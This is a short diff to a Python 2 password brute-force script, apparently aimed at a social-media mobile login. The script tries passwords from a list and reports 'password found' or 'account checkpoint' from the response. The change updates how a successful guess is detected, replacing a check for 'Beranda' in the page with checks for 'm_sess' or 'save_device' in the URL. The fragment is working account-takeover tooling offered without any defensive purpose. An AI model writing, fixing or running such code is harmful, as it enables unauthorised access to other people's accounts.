@@ -23,7 +23,7 @@ for line in x:
   if 'checkpoint' in R.url:
     print 'account checkpoint',password
     break
-  elif 'Beranda' in R.content:
+  elif 'm_sess' in R.url or 'save_device' in R.url:
     print 'password found',password
     break
   else:
